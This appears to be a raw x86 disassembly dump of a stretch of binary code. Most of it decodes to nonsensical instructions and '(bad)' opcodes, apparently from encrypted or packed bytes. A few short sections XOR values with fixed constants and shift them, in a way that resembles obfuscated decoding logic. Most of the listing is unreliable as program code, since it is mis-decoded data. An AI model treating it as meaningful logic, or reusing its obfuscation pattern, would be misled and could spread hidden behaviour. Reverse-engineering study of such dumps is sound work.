  407cdb:	sub    eax,0xd3791663
  407ce0:	xor    dh,BYTE PTR [eax+0x341ad44f]
  407ce6:	je     0x407c87
  407ce8:	mov    dl,0x88
  407cea:	test   al,0x4f
  407cec:	xchg   esi,eax
  407ced:	jp     0x407d68
  407cef:	jp     0x407d06
  407cf1:	in     al,dx
  407cf2:	xor    bl,BYTE PTR [edi+0x6d]
  407cf5:	leave  
  407cf6:	push   0x1a
  407cf8:	fcom   QWORD PTR [edi]
  407cfa:	push   0x6b2b3431
  407cff:	and    ch,BYTE PTR [ebx-0x35]
  407d02:	(bad)  
  407d03:	cdq    
  407d04:	pop    eax
  407d05:	ror    DWORD PTR [edx+0x57],1
  407d08:	fild   QWORD PTR [esi+0x66]
  407d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d0c:	push   edx
  407d0d:	or     edi,DWORD PTR [edx]
  407d0f:	adc    eax,0x5d85a026
  407d14:	aam    0xe6
  407d16:	inc    esi
  407d17:	mov    DWORD PTR [edi+0x75],esi
  407d1a:	scas   al,BYTE PTR es:[edi]
  407d1b:	pusha  
  407d1c:	mov    ch,0xd9
  407d1e:	out    dx,eax
  407d1f:	jae    0x407d86
  407d21:	or     BYTE PTR [ebx+0x27298157],dl
  407d27:	push   0x3d92bdf4
  407d2c:	fwait
  407d2d:	mov    bl,0xd1
  407d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d30:	lea    esi,[ecx-0x1c]
  407d33:	fadd   QWORD PTR [eax-0x75]
  407d36:	mov    eax,ds:0x5d8f38a3
  407d3b:	mov    eax,ds:0x890396bd
  407d40:	stc    
  407d41:	add    bl,ah
  407d43:	xchg   BYTE PTR [ebx+0x54a40bcf],dl
  407d49:	push   edi
  407d4a:	lock es retf 
  407d4d:	xor    al,0xd3
  407d4f:	(bad)  
  407d51:	fild   WORD PTR [esi-0x31]
  407d54:	fcmovb st,st(4)
  407d56:	inc    esp
  407d57:	push   es
  407d58:	xor    BYTE PTR [ebp+0x12],0xc6
  407d5c:	cmc    
  407d5d:	stos   DWORD PTR es:[edi],eax
  407d5e:	cmp    cl,bh
  407d60:	retf   0x919c
  407d63:	les    esi,FWORD PTR [eax+0x5b9c67b6]
  407d69:	mov    ch,0x79
  407d6b:	mov    ecx,0x24276fd0
  407d70:	jge    0x407d60
  407d72:	mov    bh,BYTE PTR [ecx-0x7b94c8df]
  407d78:	adc    esp,DWORD PTR [esi]
  407d7a:	out    dx,al
  407d7b:	push   ebp
  407d7c:	xor    al,0xa5
  407d7e:	push   0x71
  407d80:	ss leave 
  407d82:	out    0x20,al
  407d84:	aam    0xab
  407d86:	and    BYTE PTR [ebx],bl
  407d88:	mov    ebx,0x64df8861
  407d8d:	xor    BYTE PTR [eax-0x414b98dc],dh
  407d93:	es mul edi
  407d96:	out    0xe,al
  407d98:	imul   ebp,DWORD PTR [ebp-0x7742be20],0xffffffb4
  407d9f:	sbb    eax,0x2bc50b39
  407da4:	cmp    eax,0x7fbfeb7f
  407da9:	mov    cl,0x15
  407dab:	jecxz  0x407d37
  407dad:	jecxz  0x407d81
  407daf:	pop    esp
  407db0:	lahf   
  407db1:	mov    edx,0x1d8b39a2
  407db6:	scas   eax,DWORD PTR es:[edi]
  407db7:	test   DWORD PTR [edi+edi*1-0x38],edx
  407dbb:	sub    eax,0x1bd25f00
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xe59c107e
  407e7d:	stos   BYTE PTR es:[edi],al
  407e7e:	and    ch,BYTE PTR [edi+0x18]
  407e81:	sbb    BYTE PTR [esi-0x5fe7e7ee],bl
  407e87:	dec    ebp
  407e88:	inc    ecx
  407e89:	sub    esi,edi
  407e8b:	cli    
  407e8c:	push   ebp
  407e8d:	mov    edi,0xb0b65a60
  407e92:	cwde   
  407e93:	xor    al,0x41
  407e95:	cmp    bh,dl
  407e97:	daa    
  407e98:	pop    ecx
  407e99:	fnstcw WORD PTR [ebx-0x86256b8]
  407e9f:	cwde   
  407ea0:	in     eax,0x56
  407ea2:	loop   0x407ee7
  407ea4:	dec    edx
  407ea5:	addr16 add al,0xd5
  407ea8:	lods   eax,DWORD PTR ds:[esi]
  407ea9:	jns    0x407e6e
  407eab:	(bad)  
  407eac:	rcr    BYTE PTR [edx],1
  407eae:	xchg   ebx,eax
  407eaf:	cs inc ecx
  407eb1:	cmp    ecx,ebx
  407eb3:	addr16 push ss
  407eb5:	pop    edi
  407eb6:	xchg   edx,eax
  407eb7:	ret    
  407eb8:	pop    edx
  407eb9:	mov    dh,0x26
  407ebb:	loop   0x407ef0
  407ebd:	jmp    0x407e99
  407ebf:	inc    ebp
  407ec0:	pop    ds
  407ec1:	cmp    al,0x26
  407ec3:	lods   al,BYTE PTR ds:[esi]
  407ec4:	stos   BYTE PTR es:[edi],al
  407ec5:	into   
  407ec6:	add    esp,DWORD PTR [eax+0x28]
  407ec9:	addr16 jl 0x407f2c
  407ecc:	sar    DWORD PTR [esi],0x5a
  407ecf:	pop    esp
  407ed0:	cld    
  407ed1:	jns    0x407e8d
  407ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed4:	leave  
  407ed5:	push   cs
  407ed6:	enter  0xfaf4,0x83
  407eda:	lea    ebp,[esi-0x13300b71]
  407ee0:	lods   al,BYTE PTR ds:[esi]
  407ee1:	cld    
  407ee2:	iret   
  407ee3:	jns    0x407ebd
  407ee5:	adc    ah,bl
  407ee7:	jl     0x407e73
  407ee9:	cdq    
  407eea:	or     al,0xae
  407eec:	add    al,0xdc
  407eee:	push   esp
  407eef:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  407ef1:	push   DWORD PTR [edx+0x40]
  407ef4:	inc    ecx
  407ef5:	inc    eax
  407ef6:	sahf   
  407ef7:	not    DWORD PTR [esi]
  407ef9:	mov    edx,0x77945f8c
  407efe:	sar    BYTE PTR [ebx-0x1],0xc0
  407f02:	call   0xde6a96a7
  407f07:	push   esi
  407f08:	adc    eax,0x7373ea28
  407f0d:	dec    eax
  407f0e:	daa    
  407f0f:	addr16 jae 0xaa0aaf1a
  407f16:	stos   DWORD PTR es:[edi],eax
  407f17:	add    al,0x0
  407f19:	inc    eax
  407f1a:	aad    0xfa
  407f1c:	pop    ebp
  407f1d:	js     0x407ee0
  407f1f:	pop    edi
  407f20:	or     al,BYTE PTR [edx+ebx*1]
  407f23:	xchg   BYTE PTR [edi-0x1b],dh
  407f26:	pop    ebx
  407f27:	jb     0x407f5c
  407f29:	push   ds
  407f2a:	pop    ebx
  407f2b:	sbb    ebx,ebp
  407f2d:	inc    eax
  407f2e:	sti    
  407f2f:	(bad)  
  407f30:	xlat   BYTE PTR ds:[ebx]
  407f31:	(bad)  
  407f32:	leave  
  407f33:	rol    DWORD PTR [edx-0xe462c81],cl
  407f39:	mov    bl,0x89
  407f3b:	daa    
  407f3c:	push   ebp
  407f3d:	inc    eax
  407f3e:	pop    eax
  407f3f:	xor    al,0x8e
  407f41:	in     al,0x45
  407f43:	adc    ch,BYTE PTR [ecx]
  407f45:	in     al,dx
  407f46:	arpl   WORD PTR [edi-0x43],dx
  407f49:	xor    bl,bh
  407f4b:	mov    esi,0x4ff509d8
  407f50:	push   esp
  407f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f52:	mov    cl,ah
  407f54:	test   eax,0xac04ecfc
  407f59:	mov    cl,0xac
  407f5b:	mov    ebx,0xdf4eb3b8
  407f60:	cs (bad) 
  407f63:	addr16 retf 
  407f65:	(bad)  
  407f67:	pusha  
  407f68:	or     esp,edx
  407f6a:	mov    ebx,0x2ba9fafa
  407f70:	stos   BYTE PTR es:[edi],al
  407f71:	xchg   ebp,eax
  407f72:	dec    edx
  407f73:	repnz pop ds
  407f75:	stc    
  407f76:	jae    0x407faa
  407f78:	int3   
  407f79:	dec    edi
  407f7a:	cld    
  407f7b:	ja     0x407fb4
  407f7d:	pushf  
  407f7e:	shl    ch,1
  407f80:	bound  ecx,QWORD PTR es:[ebx-0x69]
  407f84:	sbb    BYTE PTR [ecx-0x76],dh
  407f87:	rcl    DWORD PTR [esi-0x70],1
  407f8a:	pusha  
  407f8b:	jmp    0xa66b8d30
  407f90:	out    dx,al
  407f91:	pop    ss
  407f92:	push   edi
  407f93:	adc    edx,DWORD PTR [edx]
  407f95:	mov    eax,DWORD PTR [ebp-0x466e3a00]
  407f9b:	mov    edi,0x5fff3fe0
  407fa0:	push   esi
  407fa1:	in     eax,dx
  407fa2:	inc    esp
  407fa3:	ins    DWORD PTR es:[edi],dx
  407fa4:	pop    ebp
  407fa5:	add    eax,0x3fb5b430
  407faa:	lea    ebx,ds:0xde58730b
  407fb0:	jns    0x407f89
  407fb2:	mov    ebp,0x8c2682b4
  407fb7:	jg     0x408017
  407fb9:	stos   DWORD PTR es:[edi],eax
  407fba:	jmp    0x407f7e
  407fbc:	clc    
  407fbd:	out    0x5c,eax
  407fbf:	pop    esi
  407fc0:	and    al,0x5e
  407fc2:	shl    BYTE PTR [edi],0x75
  407fc5:	mov    esp,0x33e3bd78
  407fca:	xchg   DWORD PTR [ebp+0x79dac7a8],ecx
  407fd0:	inc    ecx
  407fd1:	jp     0x407f54
  407fd3:	mov    edi,0x72db8231
  407fd8:	out    0x98,al
  407fda:	retf   0x448c
  407fdd:	pop    esi
  407fde:	add    BYTE PTR [ebx],0x4a
  407fe1:	mov    gs,WORD PTR [edi+eax*1+0x7a175212]
  407fe8:	gs xchg esp,eax
  407fea:	ret    0xd29e
  407fed:	retf   
  407fee:	push   ebp
  407fef:	pop    ecx
  407ff0:	mov    cl,0xd1
  407ff2:	ret    0xacc0
  407ff5:	stc    
  407ff6:	add    BYTE PTR [ebx+0x592089cb],dl
  407ffc:	test   BYTE PTR [esi-0xab60e84],bl
  408002:	cmp    al,0xff
  408004:	fbld   TBYTE PTR [esi]
  408006:	push   cs
  408007:	dec    edx
  408008:	pop    esi
  408009:	mov    dh,0x3f
  40800b:	fisub  DWORD PTR [esi+0x13]
  40800e:	(bad)  
  40800f:	sti    
  408010:	dec    ebx
  408011:	jns    0x408019
  408013:	lds    edx,FWORD PTR [edx]
  408015:	bound  eax,QWORD PTR ss:[esi]
  408018:	out    0x28,al
  40801a:	or     DWORD PTR [edi-0x24683474],esp
  408020:	fwait
  408021:	ret    0xaf04
  408024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408025:	fild   QWORD PTR [ebx]
  408027:	push   ds
  408028:	fwait
  408029:	sar    BYTE PTR [edi-0x6a5a4769],1
  40802f:	cmc    
  408030:	cs jl  0x40800f
  408033:	pusha  
  408034:	fnstenv [eax+0x4da4916b]
  40803a:	in     eax,dx
  40803b:	addr16 jb 0x408095
  40803e:	ss in  eax,dx
  408040:	xor    al,0x99
  408042:	test   DWORD PTR [edi-0x10],0xd7a4c10a
  408049:	add    eax,0x3446e932
  40804e:	or     eax,0x7d35ff1f
  408053:	clc    
  408054:	dec    edx
  408055:	pop    ebx
  408056:	mov    ss,edi
  408058:	hlt    
  408059:	add    eax,0xa8c4714a
  40805e:	sbb    BYTE PTR [ebp+0x2efb199f],dh
  408064:	xchg   edx,eax
  408065:	adc    cl,ch
  408067:	jnp    0x408086
  408069:	inc    edx
  40806a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40806c:	and    BYTE PTR [ebx],ch
  40806e:	mov    ds:0x4dfdc435,al
  408073:	gs repz out dx,eax
  408076:	(bad)  
  408077:	cmc    
  408078:	in     al,dx
  408079:	imul   ecx,DWORD PTR [ebx+0x12],0x2051a37b
  408080:	push   es
  408081:	jmp    0x9cc7:0x541a737a
  408088:	mov    edx,0xc45e4858
  40808d:	jge    0x408096
  40808f:	ret    0x972e
  408092:	jae    0x4080ec
  408094:	push   ecx
  408095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408096:	mov    esp,DWORD PTR ds:0x4841aa89
  40809c:	pop    edi
  40809d:	dec    edi
  40809e:	test   BYTE PTR [esi],ch
  4080a0:	push   ds
  4080a1:	cli    
  4080a2:	mov    esi,0x4044c5f3
  4080a7:	sahf   
  4080a8:	enter  0xe2d5,0x7f
  4080ac:	lea    ebx,[ebx+0x6564ce15]
  4080b2:	loop   0x40809f
  4080b4:	sub    al,0x19
  4080b6:	inc    edi
  4080b7:	jp     0x408080
  4080b9:	loopne 0x408134
  4080bb:	sbb    bl,bl
  4080bd:	ins    BYTE PTR es:[edi],dx
  4080be:	jmp    DWORD PTR [edi+ebp*1]
  4080c1:	(bad)  
  4080c2:	repnz ins DWORD PTR es:[edi],dx
  4080c4:	jle    0x4080ff
  4080c6:	rcl    BYTE PTR [ecx-0x36],cl
  4080c9:	fs add bl,dh
  4080cc:	jno    0x4080ba
  4080ce:	shl    BYTE PTR [eax],0x76
  4080d1:	clc    
  4080d2:	jns    0x408120
  4080d4:	xlat   BYTE PTR ds:[ebx]
  4080d5:	mov    eax,0xb7cfb171
  4080da:	xchg   edx,eax
  4080db:	inc    esi
  4080dc:	push   ebx
  4080dd:	pop    ebx
  4080de:	xchg   edi,eax
  4080df:	lods   al,BYTE PTR ds:[esi]
  4080e0:	int3   
  4080e1:	cs inc ecx
  4080e3:	add    eax,0xdac432bc
  4080e8:	ret    
  4080e9:	xchg   edi,eax
  4080ea:	loop   0x408142
  4080ec:	test   DWORD PTR [edx-0x164602ac],esi
  4080f2:	add    DWORD PTR [edi],edx
  4080f4:	call   0x6930a600
  4080f9:	adc    al,0x39
  4080fb:	fadd   QWORD PTR [ebx]
  4080fd:	arpl   WORD PTR [edi-0x6f18844b],si
  408103:	xchg   ecx,eax
  408104:	ins    BYTE PTR es:[edi],dx
  408105:	sti    
  408106:	jmp    0xacabd500
  40810b:	push   es
  40810c:	dec    ecx
  40810d:	mov    al,0x5b
  40810f:	sbb    ebx,edi
  408111:	jmp    0xb444:0xd29536d6
  408118:	mov    eax,0x1007d2ca
  40811d:	out    dx,al
  40811e:	mov    ds:0x537995b9,eax
  408123:	xadd   BYTE PTR [ecx+edi*4+0x6b34c89d],bh
  40812b:	jp     0x40818b
  40812d:	adc    edi,DWORD PTR [ebx-0x6f]
  408130:	sbb    eax,0xafc80e35
  408135:	(bad)  
  408136:	pop    ds
  408137:	jp     0x40818a
  408139:	js     0x408196
  40813b:	xor    ch,BYTE PTR [ebx]
  40813d:	adc    eax,0x8030ca9
  408142:	jge    0x408121
  408144:	ja     0x408102
  408146:	adc    eax,DWORD PTR [eax+0x17]
  408149:	and    al,0x14
  40814b:	mov    ebp,0xbd127b91
  408150:	adc    ch,bh
  408152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408153:	and    dl,BYTE PTR [ecx+0x5a73556b]
  408159:	jmp    0x408160
  40815b:	outs   dx,BYTE PTR ds:[esi]
  40815c:	xor    BYTE PTR [esi-0x1627f4af],cl
  408162:	test   eax,0x2e5f4b1
  408167:	xchg   esi,eax
  408169:	repz adc esi,DWORD PTR [ebp-0x23]
  40816d:	pop    edi
  40816e:	retf   0x7bfa
  408171:	or     DWORD PTR [ecx-0x3ff55426],ebx
  408177:	adc    al,0xad
  408179:	jge    0x4081d7
  40817b:	or     al,0x10
  40817d:	mov    edi,0xf53ca462
  408182:	mov    eax,edx
  408184:	ds sbb eax,0x5b0d102a
  40818a:	mov    eax,0x881e8098
  40818f:	sar    DWORD PTR [eax],1
  408191:	aaa    
  408192:	push   ebx
  408193:	adc    bl,BYTE PTR [ebx]
  408195:	sub    al,0xbd
  408197:	pop    ebx
  408198:	push   esp
  408199:	inc    edx
  40819a:	push   ds
  40819b:	gs pop edx
  40819d:	iret   
  40819e:	lea    esi,[eax]
  4081a0:	mov    ah,0x96
  4081a2:	inc    ebp
  4081a3:	jae    0x4081c3
  4081a5:	pop    esp
  4081a6:	cmp    BYTE PTR [eax-0x17641682],bh
  4081ac:	mov    edi,DWORD PTR [eax]
  4081ae:	pop    edx
  4081af:	(bad)  
  4081b0:	icebp  
  4081b1:	sub    ch,BYTE PTR [esi-0x3e8a78e7]
  4081b7:	dec    ebp
  4081b8:	cmp    eax,0x83de1238
  4081bd:	inc    eax
  4081be:	xchg   esp,eax
  4081bf:	push   ecx
  4081c0:	lock mov cs,edi
  4081c3:	cld    
  4081c4:	js     0x4081b3
  4081c6:	inc    eax
  4081c7:	cdq    
  4081c8:	mov    ch,0x39
  4081ca:	inc    edi
  4081cb:	mov    eax,ds:0xc85f25a4
  4081d0:	fist   WORD PTR [ebp+eiz*4+0x6f]
  4081d4:	out    0xb1,al
  4081d6:	adc    BYTE PTR [ecx-0x55],ah
  4081d9:	je     0x408162
  4081db:	(bad)  
  4081dc:	pop    edi
  4081dd:	pusha  
  4081de:	jmp    0x6bbf:0xf931a657
  4081e5:	pop    esi
  4081e6:	push   edi
  4081e7:	stos   DWORD PTR es:[edi],eax
  4081e8:	mov    ecx,DWORD PTR [eax+0x4c7d67c7]
  4081ee:	pop    es
  4081ef:	or     BYTE PTR [ebx-0x4ef1f7b6],dh
  4081f5:	out    0x1f,al
  4081f7:	mov    al,0x24
  4081f9:	dec    ebp
  4081fa:	stos   DWORD PTR es:[edi],eax
  4081fb:	or     al,0xe7
  4081fd:	mov    ebp,0x5a9d30b4
  408202:	push   edi
  408203:	repz mov ah,0xbd
  408206:	stos   DWORD PTR es:[edi],eax
  408207:	fidiv  WORD PTR [ebp-0x32]
  40820a:	jns    0x4081cd
  40820c:	iret   
  40820d:	adc    DWORD PTR [ecx-0x4e],esp
  408210:	cwde   
  408211:	sar    al,0x78
  408214:	into   
  408215:	leave  
  408216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408217:	or     eax,0xd6651a1
  40821c:	(bad)  
  40821d:	push   0x0
  40821f:	lahf   
  408220:	arpl   WORD PTR [ebx+0x1c9d4aa8],bx
  408226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408227:	push   ebp
  408228:	cmp    DWORD PTR [esi+0x3ea07004],edi
  40822e:	push   ebp
  40822f:	sar    DWORD PTR [edx],1
  408231:	add    al,0x79
  408233:	pop    ss
  408234:	pop    esp
  408235:	imul   ecx,DWORD PTR [eax+eiz*4],0x847e68a5
  40823c:	cmp    eax,0x828f23e
  408241:	ret    
  408242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408243:	cmp    eax,0x89204c88
  408248:	inc    ebp
  408249:	xchg   esp,eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0xb1b7709d
  40828a:	xor    DWORD PTR [esi+0x181867a8],edi
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [ecx+0x7d],cl
  408296:	ins    BYTE PTR es:[edi],dx
  408297:	idiv   BYTE PTR [edi]
  408299:	or     ebp,DWORD PTR [edi-0x5958c5fd]
  40829f:	ins    DWORD PTR es:[edi],dx
  4082a0:	test   BYTE PTR [esi+edi*4],0xc
  4082a4:	or     bl,BYTE PTR [ebp-0x30]
  4082a7:	sub    BYTE PTR ds:0x18c1f26c,ch
  4082ad:	mov    esp,ss
  4082af:	sbb    DWORD PTR [edx+0x28],edx
  4082b2:	fsubr  QWORD PTR [esi]
  4082b4:	fcomp  QWORD PTR [esi+0x10c5f9b6]
  4082ba:	pop    ss
  4082bb:	(bad)  
  4082bc:	cli    
  4082bd:	div    ebp
  4082bf:	jmp    0xde5f:0xc796e1b4
  4082c6:	ss cmp al,0x1b
  4082c9:	jo     0x40833a
  4082cb:	repz mov dh,0x66
  4082ce:	shl    BYTE PTR [ecx-0x1b],cl
  4082d1:	adc    eax,0x2e8e4b0
  4082d6:	enter  0x8fbd,0xf0
  4082da:	jmp    0xb0f7bc79
  4082df:	(bad)  
  4082e0:	clc    
  4082e1:	jae    0x4082d6
  4082e3:	cdq    
  4082e4:	(bad)  
  4082e5:	fadd   st(5),st
  4082e7:	dec    edx
  4082e8:	push   esi
  4082e9:	call   0x4ee367ce
  4082ee:	std    
  4082ef:	retf   0x3265
  4082f2:	into   
  4082f3:	inc    esi
  4082f4:	rcl    DWORD PTR [ebx+0x39a3ffa5],1
  4082fa:	nop
  4082fb:	inc    ecx
  4082fc:	arpl   WORD PTR [ebp+0x6e],di
  4082ff:	jbe    0x4082b5
  408301:	in     al,dx
  408302:	push   ebp
  408303:	mov    DWORD PTR [edi+0xf9399d7],eax
  408309:	inc    DWORD PTR [edi+0x5b265381]
  40830f:	mov    edx,ebx
  408311:	ss ja  0x408386
  408314:	leave  
  408315:	push   edi
  408316:	pop    ds
  408317:	pop    ds
  408318:	(bad)  
  408319:	cmp    dh,BYTE PTR [edx+edx*1+0x1d8126e2]
  408320:	iret   
  408321:	pop    ebp
  408322:	test   DWORD PTR [eax-0x4a],esi
  408325:	clc    
  408326:	push   cs
  408327:	loopne 0x4082ae
  408329:	xor    ah,BYTE PTR [ebp+eiz*2-0x5f]
  40832d:	fwait
  40832e:	cdq    
  40832f:	mov    eax,ds:0x6d55bf8c
  408334:	repnz and eax,0x59a7fd9b
  40833a:	xlat   BYTE PTR ds:[bx]
  40833c:	fiadd  DWORD PTR [ebp*1+0x4feddd24]
  408343:	js     0x4083b3
  408345:	add    eax,0xa844b15
  40834a:	ja     0x4083b5
  40834c:	out    0xda,eax
  40834e:	out    0xb4,eax
  408350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408351:	sub    eax,0x48c52af7
  408356:	inc    esp
  408357:	cli    
  408358:	aad    0xc5
  40835a:	sbb    eax,0x99e6afc9
  40835f:	out    0x23,eax
  408361:	jmp    0x4082e6
  408363:	daa    
  408364:	std    
  408365:	in     eax,dx
  408366:	push   0x2f
  408368:	inc    eax
  408369:	jo     0x40834e
  40836b:	xchg   esp,edi
  40836d:	fnstenv [esp+ebx*2+0x3ddda64e]
  408374:	stc    
  408375:	out    0x7,eax
  408377:	cmc    
  408378:	pop    ebx
  408379:	ret    
  40837a:	fsub   DWORD PTR [ebp-0x3dcd2b9b]
  408380:	mov    edx,0x14fdca7a
  408385:	pop    ecx
  408386:	jge    0x4083d9
  408388:	jp     0x408327
  40838a:	push   0x43
  40838c:	xor    DWORD PTR [esi+0x37],ecx
  40838f:	inc    edx
  408390:	cmp    DWORD PTR [esi-0x45f90a8a],esp
  408396:	jle    0x40835c
  408398:	or     eax,0xd5c1f26a
  40839d:	mov    ecx,eax
  40839f:	add    eax,DWORD PTR [ebp+0x11bd99a7]
  4083a5:	xchg   esp,eax
  4083a6:	mov    ebx,0x780aa49a
  4083ab:	sub    esp,ecx
  4083ad:	sbb    ecx,esp
  4083af:	xor    ecx,DWORD PTR [edx+esi*4]
  4083b2:	iret   
  4083b3:	sbb    bl,cl
  4083b5:	cmp    cl,BYTE PTR [ebp+0x69]
  4083b8:	stc    
  4083b9:	jmp    0x40837c
  4083bb:	shr    cl,1
  4083bd:	push   esp
  4083be:	rol    cl,1
  4083c0:	xchg   ecx,eax
  4083c1:	leave  
  4083c2:	fist   WORD PTR [esi+0x6c335caf]
  4083c8:	adc    al,0xdd
  4083ca:	aas    
  4083cb:	sub    DWORD PTR [eax-0x2facae66],esi
  4083d1:	clc    
  4083d2:	lods   eax,DWORD PTR ds:[esi]
  4083d3:	inc    edx
  4083d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083d5:	push   ebx
  4083d6:	pop    eax
  4083d7:	lock scas al,BYTE PTR es:[edi]
  4083d9:	add    BYTE PTR [esp+ecx*8],al
  4083dc:	jmp    0xb11fc66f
  4083e1:	xlat   BYTE PTR ds:[ebx]
  4083e2:	out    dx,eax
  4083e3:	out    dx,al
  4083e4:	repz std 
  4083e6:	nop
  4083e7:	or     bl,BYTE PTR ds:0xb421cc4f
  4083ed:	push   ebx
  4083ee:	xchg   esp,eax
  4083ef:	mov    esi,0x67c35564
  4083f4:	or     eax,0xaeef7359
  4083f9:	loope  0x408424
  4083fb:	cli    
  4083fc:	js     0x4083ef
  4083fe:	push   ss
  4083ff:	mov    esp,0x4d7fb9b2
  408404:	shl    BYTE PTR [esi],cl
  408406:	adc    BYTE PTR [ebp+0x17],al
  408409:	int    0xdd
  40840b:	stc    
  40840c:	sti    
  40840d:	cmp    eax,DWORD PTR [esi-0x2a]
  408410:	cdq    
  408411:	cwde   
  408412:	jbe    0x4083a4
  408414:	adc    eax,0x9b8a61b4
  408419:	cmp    BYTE PTR [edx],0x44
  40841c:	gs xchg ebp,eax
  40841e:	push   edx
  40841f:	fsub   st(6),st
  408421:	cdq    
  408422:	icebp  
  408423:	stos   DWORD PTR es:[edi],eax
  408424:	jo     0x4083d5
  408426:	jb     0x408425
  408428:	in     eax,dx
  408429:	loop   0x408495
  40842b:	ficom  WORD PTR [edx]
  40842d:	mov    al,ds:0x81de2275
  408432:	xchg   DWORD PTR [ebp+0x3e],esi
  408435:	retf   0x201c
  408438:	loope  0x408448
  40843a:	shl    edx,0xfc
  40843d:	mov    esi,0x69082697
  408442:	pop    ecx
  408443:	lahf   
  408444:	adc    DWORD PTR [ecx-0x7ebeffcd],0x493f3be4
  40844e:	xor    eax,0x69320e82
  408453:	lock cmp ebp,esp
  408456:	es sub al,0x12
  408459:	out    0xbb,eax
  40845b:	repnz arpl WORD PTR [edi+0x139494d3],di
  408462:	fbld   TBYTE PTR [ecx+ebp*1+0x7e]
  408466:	mov    bl,0x35
  408468:	ins    BYTE PTR es:[edi],dx
  408469:	shr    BYTE PTR [ecx+0x24],0x7a
  40846d:	push   0x7c
  40846f:	push   0xffffffbf
  408471:	sub    al,0xd7
  408473:	and    edi,DWORD PTR cs:[ecx]
  408476:	mov    ds:0x6bea6d49,al
  40847b:	lods   eax,DWORD PTR ds:[esi]
  40847c:	push   esi
  40847d:	sub    DWORD PTR ds:[edi+0x18571535],edx
  408484:	adc    eax,0x1ab7b370
  408489:	pop    esi
  40848a:	(bad)  
  40848b:	add    BYTE PTR [esi-0x390873cd],dh
  408491:	mov    ds:0x6db4300c,al
  408496:	std    
  408497:	int3   
  408498:	sub    ebp,DWORD PTR [edx+0x392cdbc8]
  40849e:	and    BYTE PTR [ecx-0x2f],bl
  4084a1:	add    DWORD PTR [edi-0x67dea45c],eax
  4084a7:	jbe    0x4084ba
  4084a9:	mov    al,0xa0
  4084ab:	rcr    al,0x6c
  4084ae:	call   0xbc5f5eee
  4084b3:	push   es
